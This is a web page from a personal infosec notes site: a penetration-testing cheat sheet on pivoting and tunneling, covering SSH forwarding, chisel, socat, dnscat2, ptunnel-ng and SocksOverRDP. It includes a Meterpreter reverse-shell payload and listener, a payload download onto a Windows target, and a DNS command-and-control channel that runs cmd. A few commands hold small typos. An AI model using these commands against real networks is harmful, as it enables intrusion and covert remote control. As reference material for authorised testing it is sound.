@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <title>ovelny - chaos/pivoting-and-tunneling</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta
+      name="description"
+      content="ovelny - notes on infosec, penetration testing, programming and others"
+    />
+    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="stylesheet" type=text/css href="/assets/css/dead-simple.min.css">
+    <link rel="stylesheet" type=text/css href="/assets/css/rouge.min.css">
+    <link
+      href="/atom.xml"
+      rel="alternate"
+      title="ovelny"
+      type="application/atom+xml"
+    />
+    <script src="/assets/js/scramble-text.min.js" defer></script>
+    <script src="/assets/js/zoom-images.min.js" defer></script>
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:site" content="@ovelny"/>
+    <meta name="twitter:title" content="ovelny - chaos/pivoting-and-tunneling"/>
+    <meta name="twitter:image" content="https://ovelny.sh/assets/images/ovelny-logo.png"/>
+    <meta name="twitter:image:alt" content="ovelny logo: 6 white circles grouped together forming a triangle shape, with a black background."/>
+  </head>
+  <body>
+
+    <header>
+      <section>
+        <a href="/">
+          <img
+            class="logo"
+            src="/assets/images/ovelny-pfp.png"
+            alt="ovelny profile picture: a glitched picture of a three-eyed girl, staring intensely at the viewer."
+          />
+        </a>
+        <h2><a class="ovelny" href="/">ovelny</a></h2>
+      </section>
+      <nav>
+        <a href="/now/">now</a>
+        <a href="/chaos/">chaos</a>
+        <a href="/phasm/">phasm</a>
+        <a href="/support/">support</a>
+        <a href="/atom.xml" target="_blank" rel="noopener noreferrer">rss</a>
+        <a href="/about/">about</a>
+      </nav>
+    </header>
+    <main>
+
+    
+    <h1>Pivoting and tunneling</h1>
+
+<h2>Ping sweeps to find internal hosts</h2>
+
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># With Linux:</span>
+<span class="k">for </span>i <span class="k">in</span> <span class="o">{</span>1..254<span class="o">}</span> <span class="p">;</span><span class="k">do</span> <span class="o">(</span>ping <span class="nt">-c</span> 1 172.16.5.<span class="nv">$i</span> | <span class="nb">grep</span> <span class="s2">"bytes from"</span> &amp;<span class="o">)</span> <span class="p">;</span><span class="k">done</span>
+
+<span class="c"># With Windows and cmd.exe:</span>
+<span class="k">for</span> /L %i <span class="k">in</span> <span class="o">(</span>1 1 254<span class="o">)</span> <span class="k">do </span>ping 172.16.5.%i <span class="nt">-n</span> 1 <span class="nt">-w</span> 100 | find <span class="s2">"Reply"</span>
+
+<span class="c"># With Windows and powershell:</span>
+1..254 | % <span class="o">{</span><span class="s2">"172.16.5.</span><span class="si">$(</span><span class="nv">$_</span><span class="si">)</span><span class="s2">: </span><span class="si">$(</span>Test-Connection <span class="nt">-count</span> 1 <span class="nt">-comp</span> 172.15.5.<span class="si">$(</span><span class="nv">$_</span><span class="si">)</span> <span class="nt">-quiet</span><span class="si">)</span><span class="s2">"</span><span class="o">}</span>
+</code></pre></div>
+
+<h2>Port forwarding with SSH</h2>
+
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># Forward all data we send via port 1234 to port 3306,</span>
+<span class="c"># effectively allowing us to access the target's service on port 3306:</span>
+ssh <span class="nt">-L</span> 1234:localhost:3306 &lt;username&gt;@&lt;target IP address&gt;
+
+<span class="c"># Confirm that port forwarding worked with nmap:</span>
+nmap <span class="nt">-sV</span> <span class="nt">-p1234</span> localhost
+
+<span class="c"># You can forward multiple ports by chaining</span>
+<span class="c"># the -L ssh argument:</span>
+ssh <span class="nt">-L</span> 1234:localhost:3306 <span class="nt">-L</span> 8080:localhost:80 &lt;username&gt;@&lt;target IP address&gt;
+
+<span class="c"># Perform dynamic port forwarding to scan a</span>
+<span class="c"># network that is inacessible from our</span>
+<span class="c"># attack box:</span>
+
+<span class="c"># First, enable dynamic port forwarding on the compromised host</span>
+<span class="c"># that will act as a relay for us:</span>
+ssh <span class="nt">-D</span> 9050 &lt;username&gt;@&lt;target IP address&gt;
+
+<span class="c"># Check that proxychains on your attack box is configured with the</span>
+<span class="c"># following line present: socks4  127.0.0.1 9050</span>
+<span class="nb">cat</span> /etc/proxychains.conf
+
+<span class="c"># Route all commands to your local port 9050, where all packets will</span>
+<span class="c"># be forwarded to the compromised host over SSH. Keep in mind that</span>
+<span class="c"># only full packets are understood by proxychains, so only full TCP</span>
+<span class="c"># connect scans will work using nmap.</span>
+
+<span class="c"># Nmap ping scan on Linux targets:</span>
+proxychains nmap <span class="nt">-sn</span> 172.16.5.1-200 <span class="c"># nmap ping scan.</span>
+
+<span class="c"># Nmap full TCP connect scan without ping for windows targets:</span>
+proxychains nmap <span class="nt">-Pn</span> <span class="nt">-sT</span> 172.16.5.19
+</code></pre></div>
+
+<h2>Remote port forwarding with SSH (reverse shell example)</h2>
+
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># Suppose we have the following topology:</span>
+<span class="c"># attack box &lt;-&gt; Ubuntu compromised server &lt;-&gt; Windows server in local network only</span>
+<span class="c"># The ubuntu server can talk to the Windows server,</span>
+<span class="c"># but our attack box can't directly talk to the Windows server.</span>
+<span class="c"># We have to use the ubuntu server as a relay to get a reverse shell.</span>
+
+<span class="c"># Let's also assume we can have RDP access to the Windows server, if</span>
+<span class="c"># we leverage the compromised Ubuntu server with port forwarding.</span>
+
+<span class="c"># We generate a Windows payload with msfvenom.</span>
+<span class="c"># Note that it will connect back to the Ubuntu server,</span>
+<span class="c"># not our attack box directly:</span>
+msfvenom <span class="nt">-p</span> windows/x64/meterpreter/reverse_https <span class="nv">lhost</span><span class="o">=</span>&lt;internal IP of compromised ubuntu server&gt; <span class="nt">-f</span> exe <span class="nt">-o</span> payload.exe <span class="nv">LPORT</span><span class="o">=</span>8080
+
+<span class="c"># On your attack box, configure and run metasploit's multi/handler</span>
+<span class="c"># in msfconsole:</span>
+use exploit/multi/handler
+<span class="nb">set </span>payload windows/x64/meterpreter/reverse_https
+<span class="nb">set </span>lhost 0.0.0.0
+<span class="nb">set </span>lport 8000
+run
+
+<span class="c"># Transfer the payload to the compromised ubuntu server:</span>
+scp payload.exe &lt;username&gt;@&lt;external IP of compromised ubuntu server&gt;:~/
+
+<span class="c"># Start a python webserver on the compromised ubuntu server:</span>
+python3 <span class="nt">-m</span> http.server 8123
+
+<span class="c"># On the windows target, download the payload with RDP and powershell:</span>
+Invoke-WebRequest <span class="nt">-Uri</span> <span class="s2">"http://&lt;internal IP of compromised ubuntu server&gt;:8123/payload.exe"</span> <span class="nt">-OutFile</span> <span class="s2">"C:</span><span class="se">\p</span><span class="s2">ayload.exe"</span>
+
+<span class="c"># Use SSH remote port forwarding on attack box, to forward</span>
+<span class="c"># connections from the Ubuntu server's port 8080 to our</span>
+<span class="c"># meterpreter listener on port 8000:</span>
+ssh <span class="nt">-R</span> &lt;internal IP of compromised ubuntu server&gt;:8080:0.0.0.0:8000 &lt;username&gt;@&lt;external IP of compromised ubuntu server&gt; <span class="nt">-vN</span> <span class="c"># Verbose mode, without prompting the login shell.</span>
+
+<span class="c"># Execute the payload on the windows target and check if</span>
+<span class="c"># you received a meterpreter shell.</span>
+</code></pre></div>
+
+<h2>Port forwarding with plink (putty link) on Windows</h2>
+
+<div class="highlight"><pre class="highlight powershell"><code><span class="c"># Perform dynamic port forwarding with plink.</span><span class="w">
+</span><span class="c"># Tools like proxifier can then use that port forwarding</span><span class="w">
+</span><span class="c"># to connect through RDP, for instance:</span><span class="w">
+</span><span class="n">plink</span><span class="w"> </span><span class="nt">-ssh</span><span class="w"> </span><span class="nt">-D</span><span class="w"> </span><span class="nx">9050</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">username</span><span class="err">&gt;@&lt;</span><span class="nx">target</span><span class="w"> </span><span class="nx">IP</span><span class="w"> </span><span class="nx">address</span><span class="err">&gt;</span><span class="w">
+</span></code></pre></div>
+
+<h2>Port forwarding with netsh on Windows</h2>
+
+<div class="highlight"><pre class="highlight powershell"><code><span class="c"># Perform port forwarding with netsh.</span><span class="w">
+</span><span class="c"># we forward port 3389 (RDP) of our target to</span><span class="w">
+</span><span class="c"># port 8080 of our pivot machine:</span><span class="w">
+</span><span class="n">netsh.exe</span><span class="w"> </span><span class="nx">interface</span><span class="w"> </span><span class="nx">portproxy</span><span class="w"> </span><span class="nx">add</span><span class="w"> </span><span class="nx">v4tov4</span><span class="w"> </span><span class="nx">listenport</span><span class="o">=</span><span class="mi">8080</span><span class="w"> </span><span class="n">listenaddress</span><span class="o">=</span><span class="err">&lt;</span><span class="n">compromised</span><span class="w"> </span><span class="nx">windows</span><span class="w"> </span><span class="nx">host</span><span class="w"> </span><span class="nx">IP</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">connectport</span><span class="o">=</span><span class="mi">3389</span><span class="w"> </span><span class="n">connectaddress</span><span class="o">=</span><span class="err">&lt;</span><span class="n">internal</span><span class="w"> </span><span class="nx">target</span><span class="w"> </span><span class="nx">IP</span><span class="err">&gt;</span><span class="w">
+
+</span><span class="c"># Check port forwarding setup:</span><span class="w">
+</span><span class="n">netsh.exe</span><span class="w"> </span><span class="nx">interface</span><span class="w"> </span><span class="nx">portproxy</span><span class="w"> </span><span class="nx">show</span><span class="w"> </span><span class="nx">v4tov4</span><span class="w">
+</span></code></pre></div>
+
+<h2>socat</h2>
+
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># Listen on pivot machine's localhost on port 8080 and forward all traffic</span>
+<span class="c"># to our attack box on port 80. The same command can be used to forward</span>
+<span class="c"># traffic from our attack box to an internal target:</span>
+socat TCP4-LISTEN:8080,fork TCP4:&lt;attack box IP | internal target IP&gt;:80
+</code></pre></div>
+
+<h2>sshuttle</h2>
+
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># Connect to the pivot machine and specify a network to route</span>
+<span class="c"># by changing iptables automatically (until exiting program):</span>
+sshuttle <span class="nt">-r</span> &lt;username&gt;@&lt;compromised server IP&gt; 172.16.5.0/23 <span class="nt">-v</span> <span class="c"># Can also be a single IP address.</span>
+
+<span class="c"># Traffic routing now works and you don't even need proxychains:</span>
+nmap <span class="nt">-sV</span> <span class="nt">-p3389</span> <span class="nt">-Pn</span> 172.16.5.19
+</code></pre></div>
+
+<h2>dnscat2 for DNS encrypted tunneling</h2>
+
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># dnscat2 allows you to run an encrypted command and control channel</span>
+<span class="c"># through DNS, with TXT records. Extremely useful for isolated targets.</span>
+
+<span class="c"># On your attack box, start dnscat2 server:</span>
+dnscat2-server <span class="nt">--dns</span> <span class="nv">host</span><span class="o">=</span>&lt;attack box IP&gt;,port<span class="o">=</span>53,domain<span class="o">=</span>&lt;domain name&gt;
+
+<span class="c"># On a windows target, download dnscat2-powershell:</span>
+<span class="c"># https://github.com/lukebaggett/dnscat2-powershell</span>
+
+<span class="c"># Import the module:</span>
+import-module .<span class="se">\d</span>nscat2.ps1
+
+<span class="c"># Initiate the connection to the server on our attack box.</span>
+<span class="c"># Make sure port 53 is opened for the target:</span>
+start-dnscat2 <span class="nt">-dnsserver</span> &lt;attack box IP&gt; <span class="nt">-domain</span> &lt;domain name&gt; <span class="nt">-presharedsecret</span> &lt;secret shown with dnscat2-server&gt; <span class="nt">-exec</span> cmd
+</code></pre></div>
+
+<h2>ptunnel-ng for pivoting with ICMP</h2>
+
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># That's right, even your pings are not safe from tunneling traffic.</span>
+
+<span class="c"># On pivot / compromised machine, start ptunnel-ng server:</span>
+<span class="nb">sudo</span> ./ptunnel-ng <span class="nt">-r</span>&lt;reachable IP through attack box&gt; <span class="nt">-R22</span>
+
+<span class="c"># On attack box, connect to ptunnel-ng server:</span>
+<span class="nb">sudo </span>ptunnel-ng <span class="nt">-p</span>&lt;reachable target IP&gt; <span class="nt">-l2222</span> <span class="nt">-r</span>&lt;reachable target IP&gt; <span class="nt">-R22</span>
+
+<span class="c"># Connect to SSH over created tunnel:</span>
+ssh <span class="nt">-p2222</span> <span class="nt">-l</span>&lt;username&gt; 127.0.0.1
+
+<span class="c"># Enable dynamic port forwarding over created tunnel:</span>
+ssh <span class="nt">-D</span> 9050 <span class="nt">-p2222</span> <span class="nt">-l</span>&lt;username&gt; 127.0.0.1
+
+<span class="c"># You can then use proxychains as usual.</span>
+</code></pre></div>
+
+<h2>SocksOverRDP for pivoting on Windows</h2>
+
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># Not even RDP is safe from tunneling traffic over it.</span>
+
+<span class="c"># Download SocksOverRDP binaries: https://github.com/nccgroup/SocksOverRDP/releases</span>
+<span class="c"># Download proxifier portable binary: https://www.proxifier.com/download/#win-tab</span>
+<span class="c"># Extract them and upload them on the pivot machine.</span>
+<span class="c"># Then, on said machine, load SocksOverRDP.dll in elevated prompt:</span>
+regsvr32.exe SocksOverRDP-Plugin.dll
+
+<span class="c"># Connect to target with mstsc.exe.</span>
+<span class="c"># A warning should indicate that SocksOverRDP is active</span>
+<span class="c"># and will listen on 127.0.0.1:1080.</span>
+
+<span class="c"># Transfer SocksOverRDP-Server.exe to target</span>
+<span class="c"># and run it with elevated privileges.</span>
+
+<span class="c"># On pivot machine, check that the SOCKS listener is present</span>
+<span class="c"># on 127.0.0.1:1080</span>
+netstat <span class="nt">-bant</span> | findstr 1080
+
+<span class="c"># On proxifier GUI, go to profile -&gt; proxy servers -&gt; add,</span>
+<span class="c"># and add 127.9.9.1:1080 with SOCKS5.</span>
+<span class="c"># We can then start mstsc.exe which will route everything as planned.</span>
+<span class="c"># Keep in mind that advanced settings in mstsc.exe allow to adjust</span>
+<span class="c"># performance in the experience tab.</span>
+</code></pre></div>
+
+<h2>chisel</h2>
+
+<p>For compatibility with powershell-empire, use chisel 1.7.2.</p>
+
+<div class="highlight"><pre class="highlight shell"><code><span class="c">################</span>
+<span class="c"># Reverse pivoting with SOCKS5</span>
+<span class="c">################</span>
+
+<span class="c"># On your attack machine, run:</span>
+chisel server <span class="nt">-p</span> &lt;attack_machine_port&gt; <span class="nt">--socks5</span> <span class="nt">--reverse</span>
+
+<span class="c"># On the target, run:</span>
+chisel client &lt;attack_machine_IP&gt;:&lt;attack_machine_port&gt; R:&lt;proxychains_port&gt;:socks
+
+<span class="c"># If /etc/proxychains4.conf is configured</span>
+<span class="c"># with "socks5  127.0.0.1 1080", you don't</span>
+<span class="c"># need to specify the default port:</span>
+chisel client &lt;attack_machine_IP&gt;:&lt;attack_machine_port&gt; R:socks
+
+<span class="c"># Then prepend any command with proxychains</span>
+proxychains nmap &lt;...&gt;
+
+<span class="c">################</span>
+<span class="c"># Double reverse pivoting with SOCKS5</span>
+<span class="c">################</span>
+
+<span class="c"># In /etc/proxychains4.conf, have two lines ready for double hop:</span>
+socks5  127.0.0.1 1080
+socks5  127.0.0.1 9999
+
+<span class="c"># On attack box, run the initial server:</span>
+chisel server <span class="nt">-v</span> <span class="nt">-p</span> 9050 <span class="nt">--socks5</span> <span class="nt">--reverse</span>
+
+<span class="c"># On first target, run the first client:</span>
+./chisel client 10.10.16.14:9050 R:socks
+
+<span class="c"># Still on first target, run the second server for second target:</span>
+./chisel server <span class="nt">-v</span> <span class="nt">-p</span> 9002 <span class="nt">--socks5</span> <span class="nt">--reversse</span>
+
+<span class="c"># On second target, run second client:</span>
+.<span class="se">\c</span>hisel.exe client &lt;first target IP&gt;:9002 R:9999:socks
+
+<span class="c"># On attack box, check that double hop is working:</span>
+proxychains nmap <span class="nt">-sT</span> <span class="nt">-p</span> 22 &lt;reachable IP through second target only&gt;
+
+<span class="c">################</span>
+<span class="c"># Bind pivoting with SOCKS5</span>
+<span class="c">################</span>
+
+<span class="c"># If the target doesn't have a firewall restricting</span>
+<span class="c"># inbound connections, we might not have to use</span>
+<span class="c"># reverse pivoting.</span>
+
+<span class="c"># On the target, run:</span>
+chisel server <span class="nt">-p</span> 1234 <span class="nt">--socks5</span>
+
+<span class="c"># On your attack machine, run:</span>
+chisel client &lt;target IP&gt;:1234 &lt;proxychains_port&gt;:socks
+</code></pre></div>
+
+<h2>References</h2>
+
+<ul>
+<li><a href="https://scribe.rip/geekculture/chisel-network-tunneling-on-steroids-a28e6273c683" rel="nofollow">https://scribe.rip/geekculture/chisel-network-tunneling-on-steroids-a28e6273c683</a></li>
+</ul>
+
+    
+    </main>
+    <footer id="footer">
+      <div class="footer-section"><a href="/license/">CC BY-NC-SA 4.0</a><p>&nbsp;::&nbsp;2019 - 2025 ovelny</p></div>
+      <div class="footer-section">「七転び八起き」</div>
+    </footer>
+  </body>
+</html>
+
